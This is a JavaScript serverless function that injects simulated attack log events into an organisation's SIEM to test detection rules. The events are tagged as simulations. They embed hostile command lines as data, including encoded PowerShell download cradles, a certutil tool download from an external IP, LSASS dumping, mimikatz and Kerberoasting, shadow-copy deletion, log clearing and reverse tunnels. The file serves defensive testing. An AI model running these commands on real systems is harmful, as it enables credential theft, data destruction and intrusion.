// Vercel Serverless Function — Attack Simulation Engine
// Injects synthetic attack telemetry into org SIEM (Elastic) and EDR,
// then verifies whether detection rules fire on the injected events.
//
// Flow per technique:
//   1. INJECT — Write crafted log events into org's Elastic index
//   2. WAIT   — Allow detection engine time to evaluate (configurable)
//   3. VERIFY — Query for alerts/detections matching the injected events
//   4. CLEAN  — Remove injected test docs (tagged with simulation marker)
//
// All injected events are tagged with:
//   dacta.simulation = true
//   dacta.simulation_id = <unique run ID>
//   dacta.simulation_technique = <MITRE ID>

import https from 'https';

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || process.env.SUPABASE_URL || 'https://qiqrizggitcqwkwshmfy.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';

// Default Elastic (fallback if org has no specific SIEM)
const DEFAULT_ELASTIC_URL = process.env.ELASTIC_URL || '';
const DEFAULT_ELASTIC_API_KEY = process.env.ELASTIC_API_KEY || '';

// ── Fetch helper with optional SSL skip ──
function getFetchOptions(baseOpts) {
  if (process.env.ELASTIC_SKIP_SSL_VERIFY === 'true') {
    const agent = new https.Agent({ rejectUnauthorized: false });
    return { ...baseOpts, agent };
  }
  return baseOpts;
}

// ── Resolve SIEM credentials from org_connectors DB ──
async function resolveOrgSIEM(orgId) {
  try {
    const resp = await fetch(
      `${SUPABASE_URL}/rest/v1/org_connectors?org_id=eq.${orgId}&connector_type=eq.siem&select=vendor,api_endpoint,credentials_ref,metadata`,
      { headers: { apikey: SUPABASE_KEY, Authorization: `Bearer ${SUPABASE_KEY}` } }
    );
    const data = await resp.json();
    if (!data || data.length === 0) return null;
    const conn = data[0];
    const creds = conn.credentials_ref
      ? (typeof conn.credentials_ref === 'string' ? JSON.parse(conn.credentials_ref) : conn.credentials_ref)
      : {};
    return {
      vendor: conn.vendor,
      url: conn.api_endpoint || DEFAULT_ELASTIC_URL,
      apiKey: creds.api_key || DEFAULT_ELASTIC_API_KEY,
      metadata: conn.metadata || {}
    };
  } catch (e) {
    console.warn('[Simulate] Failed to resolve org SIEM:', e.message);
    return null;
  }
}

// ── Resolve EDR credentials from org_connectors DB ──
async function resolveOrgEDR(orgId) {
  try {
    const resp = await fetch(
      `${SUPABASE_URL}/rest/v1/org_connectors?org_id=eq.${orgId}&connector_type=eq.edr&select=vendor,api_endpoint,credentials_ref,metadata`,
      { headers: { apikey: SUPABASE_KEY, Authorization: `Bearer ${SUPABASE_KEY}` } }
    );
    const data = await resp.json();
    if (!data || data.length === 0) return null;
    const conn = data[0];
    const creds = conn.credentials_ref
      ? (typeof conn.credentials_ref === 'string' ? JSON.parse(conn.credentials_ref) : conn.credentials_ref)
      : {};
    return { vendor: conn.vendor, apiEndpoint: conn.api_endpoint, creds, metadata: conn.metadata || {} };
  } catch (e) {
    return null;
  }
}

// ═════════════════════════════════════════════════════
// ATTACK PAYLOAD TEMPLATES — ECS-formatted synthetic events
// Each technique produces a realistic log event that should
// trigger a properly-configured detection rule.
// ═════════════════════════════════════════════════════

function generateSimulationId() {
  return 'sim-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
}

const SIM_HOSTNAME = 'DACTA-SIM-HOST';
const SIM_USER = 'dacta-sim-user';
const SIM_IP = '10.99.99.99';
const SIM_MARKER = 'dacta-simulation-test';

function buildAttackEvent(technique, simId, orgNamespace) {
  const now = new Date().toISOString();
  const base = {
    '@timestamp': now,
    'dacta': {
      simulation: true,
      simulation_id: simId,
      simulation_technique: technique,
      simulation_marker: SIM_MARKER
    },
    'event': { kind: 'event', module: 'dacta-simulation' },
    'host': { name: SIM_HOSTNAME, ip: [SIM_IP], os: { family: 'windows', name: 'Windows 10', version: '10.0.19045' } },
    'user': { name: SIM_USER, domain: 'DACTA-SIM' },
    'source': { ip: SIM_IP },
    'agent': { name: 'dacta-sim-agent', type: 'simulation' }
  };

  const PAYLOADS = {
    // ── T1566: Phishing — Suspicious email attachment execution ──
    'T1566': {
      ...base,
      'event': { ...base.event, category: ['email','malware'], type: ['info'], action: 'email-attachment-opened', outcome: 'success' },
      'email': { from: { address: ['attacker@evil-domain.test'] }, subject: 'Urgent Invoice - Please Review', attachments: [{ file: { name: 'invoice.xlsm', size: 48200, mime_type: 'application/vnd.ms-excel.sheet.macroEnabled.12' } }] },
      'file': { name: 'invoice.xlsm', extension: 'xlsm', size: 48200, hash: { sha256: 'a3f4b8c2e1d9f0a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4' } },
      'process': { name: 'EXCEL.EXE', pid: 9901, executable: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', command_line: '"EXCEL.EXE" "C:\\Users\\' + SIM_USER + '\\Downloads\\invoice.xlsm"' },
      'threat': { technique: { id: ['T1566'], name: ['Phishing'] }, tactic: { name: ['Initial Access'] } },
      'message': '[DACTA-SIM] Spearphishing attachment opened — macro-enabled Excel document from external sender'
    },

    // ── T1059: PowerShell Execution — Encoded command download cradle ──
    'T1059': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': {
        name: 'powershell.exe', pid: 9902, executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        command_line: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==',
        args: ['-NoP', '-NonI', '-W', 'Hidden', '-Enc', 'SQBFAFgAIAAoAE4AZQB3AC...'],
        parent: { name: 'cmd.exe', pid: 9900, executable: 'C:\\Windows\\System32\\cmd.exe' }
      },
      'threat': { technique: { id: ['T1059', 'T1059.001'], name: ['Command and Scripting Interpreter', 'PowerShell'] }, tactic: { name: ['Execution'] } },
      'message': '[DACTA-SIM] Encoded PowerShell download cradle execution — IEX(New-Object Net.WebClient).DownloadString'
    },

    // ── T1003: LSASS Dump — Process access to lsass.exe ──
    'T1003': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['access'], action: 'process-accessed', outcome: 'success' },
      'process': {
        name: 'procdump64.exe', pid: 9903, executable: 'C:\\Users\\' + SIM_USER + '\\Desktop\\procdump64.exe',
        command_line: 'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
        parent: { name: 'cmd.exe', pid: 9900 }
      },
      'destination': { process: { name: 'lsass.exe', pid: 680, executable: 'C:\\Windows\\System32\\lsass.exe' } },
      'file': { name: 'lsass.dmp', path: 'C:\\Windows\\Temp\\lsass.dmp' },
      'threat': { technique: { id: ['T1003', 'T1003.001'], name: ['OS Credential Dumping', 'LSASS Memory'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] LSASS memory dump via ProcDump — credential harvesting attempt'
    },

    // ── T1486: Ransomware Encryption — Bulk file encryption ──
    'T1486': {
      ...base,
      'event': { ...base.event, category: ['file'], type: ['change'], action: 'file-encrypted', outcome: 'success' },
      'process': { name: 'encryptor.exe', pid: 9904, executable: 'C:\\Windows\\Temp\\encryptor.exe', command_line: 'encryptor.exe --encrypt --path C:\\Users --extension .locked' },
      'file': { name: 'document.docx.locked', path: 'C:\\Users\\' + SIM_USER + '\\Documents\\document.docx.locked', extension: 'locked' },
      'threat': { technique: { id: ['T1486'], name: ['Data Encrypted for Impact'] }, tactic: { name: ['Impact'] } },
      'message': '[DACTA-SIM] Ransomware encryption — files renamed with .locked extension'
    },

    // ── T1021: Lateral Movement — SMB/RDP connection ──
    'T1021': {
      ...base,
      'event': { ...base.event, category: ['authentication','network'], type: ['start'], action: 'logon-success', outcome: 'success' },
      'source': { ip: SIM_IP, port: 49152 },
      'destination': { ip: '10.99.99.100', port: 445, domain: 'DC01.dacta-sim.local' },
      'process': { name: 'net.exe', pid: 9905, command_line: 'net use \\\\DC01\\C$ /user:admin P@ssw0rd' },
      'threat': { technique: { id: ['T1021', 'T1021.002'], name: ['Remote Services', 'SMB/Windows Admin Shares'] }, tactic: { name: ['Lateral Movement'] } },
      'message': '[DACTA-SIM] Lateral movement via SMB admin share — net use \\\\DC01\\C$'
    },

    // ── T1070: Log Clearing — Event log deletion ──
    'T1070': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'wevtutil.exe', pid: 9906, executable: 'C:\\Windows\\System32\\wevtutil.exe', command_line: 'wevtutil.exe cl Security', parent: { name: 'cmd.exe', pid: 9900 } },
      'threat': { technique: { id: ['T1070', 'T1070.001'], name: ['Indicator Removal', 'Clear Windows Event Logs'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Windows Security event log cleared — anti-forensics activity'
    },

    // ── T1547: Registry Run Key Persistence ──
    'T1547': {
      ...base,
      'event': { ...base.event, category: ['registry'], type: ['change'], action: 'registry-value-set', outcome: 'success' },
      'process': { name: 'reg.exe', pid: 9907, command_line: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DactaSimPersist /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe"' },
      'registry': { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'DactaSimPersist', data: { strings: ['C:\\Windows\\Temp\\backdoor.exe'] } },
      'threat': { technique: { id: ['T1547', 'T1547.001'], name: ['Boot or Logon Autostart Execution', 'Registry Run Keys'] }, tactic: { name: ['Persistence'] } },
      'message': '[DACTA-SIM] Registry Run key persistence — backdoor.exe added to HKCU autostart'
    },

    // ── T1489: Service Stop — Critical service killed ──
    'T1489': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'net.exe', pid: 9908, command_line: 'net stop "Volume Shadow Copy" /y', parent: { name: 'cmd.exe', pid: 9900 } },
      'threat': { technique: { id: ['T1489'], name: ['Service Stop'] }, tactic: { name: ['Impact'] } },
      'message': '[DACTA-SIM] Critical service stopped — Volume Shadow Copy service terminated'
    },

    // ── T1490: Shadow Copy Delete ──
    'T1490': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'vssadmin.exe', pid: 9909, executable: 'C:\\Windows\\System32\\vssadmin.exe', command_line: 'vssadmin.exe delete shadows /all /quiet', parent: { name: 'cmd.exe', pid: 9900 } },
      'threat': { technique: { id: ['T1490'], name: ['Inhibit System Recovery'] }, tactic: { name: ['Impact'] } },
      'message': '[DACTA-SIM] Volume shadow copies deleted — ransomware recovery inhibition'
    },

    // ── T1204: User Execution ──
    'T1204': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'malware.exe', pid: 9910, executable: 'C:\\Users\\' + SIM_USER + '\\Downloads\\update_report.exe', command_line: 'update_report.exe', parent: { name: 'explorer.exe', pid: 1200 } },
      'file': { name: 'update_report.exe', path: 'C:\\Users\\' + SIM_USER + '\\Downloads\\update_report.exe', hash: { sha256: 'deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678' } },
      'threat': { technique: { id: ['T1204', 'T1204.002'], name: ['User Execution', 'Malicious File'] }, tactic: { name: ['Execution'] } },
      'message': '[DACTA-SIM] User executed suspicious downloaded binary — update_report.exe'
    },

    // ── T1053: Scheduled Task ──
    'T1053': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'schtasks.exe', pid: 9911, command_line: 'schtasks /create /tn "DactaSimTask" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc minute /mo 5 /ru SYSTEM', parent: { name: 'cmd.exe', pid: 9900 } },
      'threat': { technique: { id: ['T1053', 'T1053.005'], name: ['Scheduled Task/Job', 'Scheduled Task'] }, tactic: { name: ['Persistence'] } },
      'message': '[DACTA-SIM] Scheduled task created for persistence — runs every 5 minutes as SYSTEM'
    },

    // ── T1098: Account Manipulation ──
    'T1098': {
      ...base,
      'event': { ...base.event, category: ['iam'], type: ['change'], action: 'user-account-modified', outcome: 'success' },
      'user': { name: SIM_USER, domain: 'DACTA-SIM', target: { name: 'admin-backdoor', group: { name: 'Domain Admins' } } },
      'process': { name: 'net.exe', pid: 9912, command_line: 'net group "Domain Admins" admin-backdoor /add /domain' },
      'threat': { technique: { id: ['T1098'], name: ['Account Manipulation'] }, tactic: { name: ['Persistence'] } },
      'message': '[DACTA-SIM] User added to Domain Admins group — privilege escalation via account manipulation'
    },

    // ── T1110: Brute Force ──
    'T1110': {
      ...base,
      'event': { ...base.event, category: ['authentication'], type: ['start'], action: 'logon-failed', outcome: 'failure' },
      'source': { ip: '203.0.113.42', geo: { country_name: 'Unknown' } },
      'user': { name: 'admin' },
      'threat': { technique: { id: ['T1110', 'T1110.003'], name: ['Brute Force', 'Password Spraying'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] Multiple failed logon attempts — password spray from external IP'
    },

    // ── T1558: Kerberoasting ──
    'T1558': {
      ...base,
      'event': { ...base.event, category: ['authentication'], type: ['info'], action: 'kerberos-tgs-request', outcome: 'success' },
      'user': { name: SIM_USER },
      'process': { name: 'rubeus.exe', pid: 9913, command_line: 'Rubeus.exe kerberoast /outfile:hashes.txt' },
      'threat': { technique: { id: ['T1558', 'T1558.003'], name: ['Steal or Forge Kerberos Tickets', 'Kerberoasting'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] Kerberoasting attack — bulk TGS requests for offline cracking'
    },

    // ── T1555: Credential Store Access ──
    'T1555': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'mimikatz.exe', pid: 9914, command_line: 'mimikatz.exe "vault::cred" exit' },
      'threat': { technique: { id: ['T1555'], name: ['Credentials from Password Stores'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] Credential vault access via Mimikatz — extracting stored credentials'
    },

    // ── T1552: Unsecured Credentials ──
    'T1552': {
      ...base,
      'event': { ...base.event, category: ['file'], type: ['access'], action: 'file-read', outcome: 'success' },
      'process': { name: 'findstr.exe', pid: 9915, command_line: 'findstr /si "password" *.txt *.xml *.ini *.cfg' },
      'file': { name: 'config.xml', path: 'C:\\inetpub\\wwwroot\\web.config' },
      'threat': { technique: { id: ['T1552'], name: ['Unsecured Credentials'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] Searching files for cleartext passwords — unsecured credential discovery'
    },

    // ── T1048: DNS Tunneling Exfiltration ──
    'T1048': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['protocol'], action: 'dns-query', outcome: 'success' },
      'dns': { question: { name: 'ZXhmaWx0cmF0ZWQ=.data.evil-dns-tunnel.test', type: 'TXT' }, response_code: 'NOERROR' },
      'source': { ip: SIM_IP },
      'destination': { ip: '198.51.100.53', port: 53 },
      'network': { bytes: 4500, protocol: 'dns', transport: 'udp' },
      'threat': { technique: { id: ['T1048', 'T1048.003'], name: ['Exfiltration Over Alternative Protocol', 'DNS'] }, tactic: { name: ['Exfiltration'] } },
      'message': '[DACTA-SIM] DNS tunneling exfiltration — base64-encoded data in subdomain queries'
    },

    // ── T1071: Application Layer C2 ──
    'T1071': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'http-request', outcome: 'success' },
      'url': { full: 'https://c2-server.evil-domain.test/beacon', domain: 'c2-server.evil-domain.test', path: '/beacon' },
      'http': { request: { method: 'POST', body: { bytes: 256 } }, response: { status_code: 200, body: { bytes: 1024 } } },
      'source': { ip: SIM_IP },
      'destination': { ip: '198.51.100.100', port: 443 },
      'user_agent': { original: 'Mozilla/5.0 (compatible; DACTA-SIM-C2-Beacon)' },
      'threat': { technique: { id: ['T1071', 'T1071.001'], name: ['Application Layer Protocol', 'Web Protocols'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] C2 beacon over HTTPS — periodic callback to known malicious domain'
    },

    // ── T1573: Encrypted Channel ──
    'T1573': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'tls-established', outcome: 'success' },
      'tls': { version: '1.3', server: { hash: { sha256: 'badcert1234567890abcdef' }, subject: 'CN=evil-c2.test' }, client: { ja3: 'e7d705a3286e19ea42f587b344ee6865' } },
      'destination': { ip: '198.51.100.200', port: 443, domain: 'encrypted-c2.evil-domain.test' },
      'threat': { technique: { id: ['T1573', 'T1573.001'], name: ['Encrypted Channel', 'Symmetric Cryptography'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] Encrypted C2 channel established — TLS to suspicious domain with unusual JA3'
    },

    // ── T1105: Ingress Tool Transfer ──
    'T1105': {
      ...base,
      'event': { ...base.event, category: ['network','file'], type: ['info'], action: 'file-download', outcome: 'success' },
      'url': { full: 'http://198.51.100.50/tools/nc.exe', domain: '198.51.100.50', path: '/tools/nc.exe' },
      'file': { name: 'nc.exe', path: 'C:\\Windows\\Temp\\nc.exe', size: 59392 },
      'process': { name: 'certutil.exe', pid: 9916, command_line: 'certutil.exe -urlcache -split -f http://198.51.100.50/tools/nc.exe C:\\Windows\\Temp\\nc.exe' },
      'threat': { technique: { id: ['T1105'], name: ['Ingress Tool Transfer'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] Ingress tool transfer via certutil — nc.exe downloaded from external IP'
    },

    // ── T1562: Disable Defenses ──
    'T1562': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'powershell.exe', pid: 9917, command_line: 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true' },
      'threat': { technique: { id: ['T1562', 'T1562.001'], name: ['Impair Defenses', 'Disable or Modify Tools'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Windows Defender real-time monitoring disabled via PowerShell'
    },

    // ── T1036: Masquerading ──
    'T1036': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'svchost.exe', pid: 9918, executable: 'C:\\Users\\' + SIM_USER + '\\AppData\\Local\\Temp\\svchost.exe', parent: { name: 'explorer.exe', pid: 1200 }, hash: { sha256: 'fakesvchosthash1234567890abcdef' } },
      'threat': { technique: { id: ['T1036', 'T1036.005'], name: ['Masquerading', 'Match Legitimate Name or Location'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Process masquerading — svchost.exe running from non-standard path (user temp)'
    },

    // ── T1078: Valid Accounts ──
    'T1078': {
      ...base,
      'event': { ...base.event, category: ['authentication'], type: ['start'], action: 'logon-success', outcome: 'success' },
      'source': { ip: '203.0.113.99', geo: { country_name: 'Russia', country_iso_code: 'RU' } },
      'user': { name: 'admin@dacta-sim.local' },
      'threat': { technique: { id: ['T1078'], name: ['Valid Accounts'] }, tactic: { name: ['Initial Access'] } },
      'message': '[DACTA-SIM] Valid account login from anomalous geolocation — Russia'
    },

    // ── T1621: MFA Fatigue ──
    'T1621': {
      ...base,
      'event': { ...base.event, category: ['authentication'], type: ['info'], action: 'mfa-push-sent', outcome: 'success' },
      'source': { ip: '203.0.113.42' },
      'user': { name: SIM_USER + '@dacta-sim.local' },
      'threat': { technique: { id: ['T1621'], name: ['Multi-Factor Authentication Request Generation'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] MFA push bombing — 15 push notifications sent in 3 minutes'
    },

    // ── T1550: Pass-the-Hash ──
    'T1550': {
      ...base,
      'event': { ...base.event, category: ['authentication'], type: ['start'], action: 'logon-success-ntlm', outcome: 'success' },
      'source': { ip: SIM_IP },
      'user': { name: 'admin', domain: 'DACTA-SIM' },
      'winlog': { logon: { type: 'Network', id: '0x3E7' }, event_data: { LogonProcessName: 'NtLmSsp', AuthenticationPackageName: 'NTLM' } },
      'threat': { technique: { id: ['T1550', 'T1550.002'], name: ['Use Alternate Authentication Material', 'Pass the Hash'] }, tactic: { name: ['Lateral Movement'] } },
      'message': '[DACTA-SIM] Pass-the-Hash — NTLM authentication without password from simulated workstation'
    },

    // ── T1556: Modify Authentication Process ──
    'T1556': {
      ...base,
      'event': { ...base.event, category: ['configuration'], type: ['change'], action: 'authentication-policy-modified', outcome: 'success' },
      'process': { name: 'powershell.exe', pid: 9919, command_line: 'Install-Module AADInternals; Set-AADIntPassThroughAuthenticationConfiguration' },
      'threat': { technique: { id: ['T1556'], name: ['Modify Authentication Process'] }, tactic: { name: ['Credential Access'] } },
      'message': '[DACTA-SIM] Authentication process modification — AADInternals PassThrough Auth backdoor'
    },

    // ── T1005: Local Data Collection ──
    'T1005': {
      ...base,
      'event': { ...base.event, category: ['file'], type: ['access'], action: 'file-enumeration', outcome: 'success' },
      'process': { name: 'powershell.exe', pid: 9920, command_line: 'Get-ChildItem -Path C:\\Users -Recurse -Include *.pdf,*.docx,*.xlsx -ErrorAction SilentlyContinue | Copy-Item -Destination C:\\Windows\\Temp\\staging' },
      'file': { path: 'C:\\Windows\\Temp\\staging', target_path: 'C:\\Windows\\Temp\\staging' },
      'threat': { technique: { id: ['T1005'], name: ['Data from Local System'] }, tactic: { name: ['Collection'] } },
      'message': '[DACTA-SIM] Local data collection — bulk copy of sensitive documents to staging directory'
    },

    // ── T1039: Network Share Collection ──
    'T1039': {
      ...base,
      'event': { ...base.event, category: ['file','network'], type: ['access'], action: 'file-read', outcome: 'success' },
      'process': { name: 'robocopy.exe', pid: 9921, command_line: 'robocopy \\\\fileserver\\confidential C:\\Windows\\Temp\\staging /E /ZB' },
      'threat': { technique: { id: ['T1039'], name: ['Data from Network Shared Drive'] }, tactic: { name: ['Collection'] } },
      'message': '[DACTA-SIM] Network share data collection — robocopy from confidential share'
    },

    // ── T1074: Data Staged ──
    'T1074': {
      ...base,
      'event': { ...base.event, category: ['file'], type: ['creation'], action: 'file-created', outcome: 'success' },
      'process': { name: '7z.exe', pid: 9922, command_line: '7z.exe a -pDacta123 C:\\Windows\\Temp\\exfil.7z C:\\Windows\\Temp\\staging' },
      'file': { name: 'exfil.7z', path: 'C:\\Windows\\Temp\\exfil.7z', size: 52428800 },
      'threat': { technique: { id: ['T1074', 'T1074.001'], name: ['Data Staged', 'Local Data Staging'] }, tactic: { name: ['Collection'] } },
      'message': '[DACTA-SIM] Data staged — 50MB password-protected archive created for exfiltration'
    },

    // ── T1567: Exfiltration to Web Service ──
    'T1567': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'http-upload', outcome: 'success' },
      'url': { full: 'https://mega.nz/upload', domain: 'mega.nz' },
      'http': { request: { method: 'PUT', body: { bytes: 52428800 } } },
      'source': { ip: SIM_IP },
      'threat': { technique: { id: ['T1567', 'T1567.002'], name: ['Exfiltration Over Web Service', 'Exfiltration to Cloud Storage'] }, tactic: { name: ['Exfiltration'] } },
      'message': '[DACTA-SIM] Exfiltration to cloud storage — 50MB upload to mega.nz'
    },

    // ── T1041: Exfiltration Over C2 ──
    'T1041': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'data-exfiltration', outcome: 'success' },
      'source': { ip: SIM_IP, bytes: 52428800 },
      'destination': { ip: '198.51.100.100', port: 443 },
      'network': { bytes: 52428800, direction: 'outbound' },
      'threat': { technique: { id: ['T1041'], name: ['Exfiltration Over C2 Channel'] }, tactic: { name: ['Exfiltration'] } },
      'message': '[DACTA-SIM] Large outbound transfer over C2 channel — 50MB exfiltration detected'
    },

    // ── T1095: Non-Application Layer Protocol ──
    'T1095': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'connection-established', outcome: 'success' },
      'destination': { ip: '198.51.100.150', port: 8443 },
      'network': { transport: 'tcp', protocol: 'unknown', bytes: 8192 },
      'threat': { technique: { id: ['T1095'], name: ['Non-Application Layer Protocol'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] Non-standard protocol C2 — raw TCP connection to suspicious port'
    },

    // ── T1572: Protocol Tunneling ──
    'T1572': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'tunnel-established', outcome: 'success' },
      'process': { name: 'ssh.exe', pid: 9923, command_line: 'ssh -D 1080 -C attacker@198.51.100.200' },
      'destination': { ip: '198.51.100.200', port: 22 },
      'threat': { technique: { id: ['T1572'], name: ['Protocol Tunneling'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] Protocol tunneling — SSH dynamic port forwarding (SOCKS proxy)'
    },

    // ── T1090: Proxy ──
    'T1090': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'proxy-connection', outcome: 'success' },
      'process': { name: 'chisel.exe', pid: 9924, command_line: 'chisel.exe client 198.51.100.200:8080 R:socks' },
      'destination': { ip: '198.51.100.200', port: 8080 },
      'threat': { technique: { id: ['T1090'], name: ['Proxy'] }, tactic: { name: ['Command and Control'] } },
      'message': '[DACTA-SIM] Reverse SOCKS proxy via Chisel — C2 tunneling tool detected'
    },

    // ── T1082: System Information Discovery ──
    'T1082': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'systeminfo.exe', pid: 9925, command_line: 'systeminfo', parent: { name: 'cmd.exe', pid: 9900 } },
      'threat': { technique: { id: ['T1082'], name: ['System Information Discovery'] }, tactic: { name: ['Discovery'] } },
      'message': '[DACTA-SIM] System information discovery — systeminfo enumeration'
    },

    // ── T1083: File & Directory Discovery ──
    'T1083': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'dir', pid: 9926, command_line: 'cmd /c dir C:\\Users\\* /s /b > C:\\Windows\\Temp\\file_list.txt' },
      'threat': { technique: { id: ['T1083'], name: ['File and Directory Discovery'] }, tactic: { name: ['Discovery'] } },
      'message': '[DACTA-SIM] File and directory discovery — recursive enumeration of user directories'
    },

    // ── T1046: Network Service Scanning ──
    'T1046': {
      ...base,
      'event': { ...base.event, category: ['network'], type: ['connection'], action: 'port-scan', outcome: 'success' },
      'source': { ip: SIM_IP },
      'destination': { ip: '10.99.99.0/24' },
      'process': { name: 'nmap', pid: 9927, command_line: 'nmap -sV -p 1-1024 10.99.99.0/24' },
      'threat': { technique: { id: ['T1046'], name: ['Network Service Discovery'] }, tactic: { name: ['Discovery'] } },
      'message': '[DACTA-SIM] Network port scanning — nmap service version detection on subnet'
    },

    // ── T1027: Obfuscation ──
    'T1027': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'powershell.exe', pid: 9928, command_line: 'powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=' },
      'threat': { technique: { id: ['T1027'], name: ['Obfuscated Files or Information'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Obfuscated PowerShell — base64 encoded download and execute command'
    },

    // ── T1055: Process Injection ──
    'T1055': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['change'], action: 'process-injection', outcome: 'success' },
      'process': { name: 'malware.exe', pid: 9929, executable: 'C:\\Windows\\Temp\\malware.exe' },
      'destination': { process: { name: 'svchost.exe', pid: 888 } },
      'threat': { technique: { id: ['T1055', 'T1055.001'], name: ['Process Injection', 'Dynamic-link Library Injection'] }, tactic: { name: ['Privilege Escalation'] } },
      'message': '[DACTA-SIM] Process injection — DLL injected into svchost.exe via CreateRemoteThread'
    },

    // ── T1218: Signed Binary Proxy ──
    'T1218': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'rundll32.exe', pid: 9930, executable: 'C:\\Windows\\System32\\rundll32.exe', command_line: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write()' },
      'threat': { technique: { id: ['T1218', 'T1218.011'], name: ['System Binary Proxy Execution', 'Rundll32'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Signed binary proxy execution — rundll32 with JavaScript payload'
    },

    // ── T1553: Subvert Trust Controls ──
    'T1553': {
      ...base,
      'event': { ...base.event, category: ['process'], type: ['start'], action: 'process-created', outcome: 'success' },
      'process': { name: 'powershell.exe', pid: 9931, command_line: 'Set-ExecutionPolicy Bypass -Scope CurrentUser -Force' },
      'threat': { technique: { id: ['T1553'], name: ['Subvert Trust Controls'] }, tactic: { name: ['Defense Evasion'] } },
      'message': '[DACTA-SIM] Subvert trust controls — PowerShell execution policy set to Bypass'
    },

    // ── T1564: Hide Artifacts ──
    'T1564': {
      ...base,
      'event': { ...base.event, category: ['file'], type: ['change'], action: 'file-attribute-modified', outcome: 'success' },
      'process': { name: 'attrib.exe', pid: 9932, command_line: 'attrib +h +s C:\\Windows\\Temp\\backdoor.exe' },
      'file': { name: 'backdoor.exe', path: 'C:\\Windows\\Temp\\backdoor.exe' },
